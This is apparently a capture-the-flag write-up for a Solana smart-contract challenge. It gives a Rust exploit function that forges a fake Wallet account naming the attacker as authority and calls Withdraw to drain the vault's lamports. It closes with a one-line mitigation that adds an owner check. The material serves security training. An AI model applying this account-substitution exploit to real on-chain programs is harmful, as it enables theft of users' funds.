# Solution


```rust
use borsh::BorshSerialize;
use level0::{Wallet, WalletInstruction};
use solana_program::instruction::{AccountMeta, Instruction};

fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    // Figure out how much we want to steal
    let amount = env.get_account(challenge.vault_address).unwrap().lamports;
    println!("Trying to steal {} lamports", amount.green());

    // Create a fake Wallet pointing to the real vault
    let hack_wallet = Wallet {
        authority: challenge.hacker.pubkey(),
        vault: challenge.vault_address,
    };

    let fake_wallet = keypair(123);
    let mut hack_wallet_data: Vec<u8> = vec![];

    hack_wallet.serialize(&mut hack_wallet_data).unwrap();

    env.create_account_with_data(&fake_wallet, hack_wallet_data);

    env.execute_as_transaction(
        &[Instruction {
            program_id: challenge.wallet_program,
            accounts: vec![
                AccountMeta::new(fake_wallet.pubkey(), false),
                AccountMeta::new(challenge.vault_address, false),
                AccountMeta::new(challenge.hacker.pubkey(), true),
                AccountMeta::new(challenge.hacker.pubkey(), false),
                AccountMeta::new_readonly(system_program::id(), false),
            ],
            data: WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),
        }],
        &[&challenge.hacker],
    )
    .print();
}

```

# Mitigation

By adding a check in the `withdraw` function, to check if the program itself is the owner of the `wallet_info` this vulnerability can be prevented:

```rust
assert_eq!(wallet_info.owner, _program_id);
```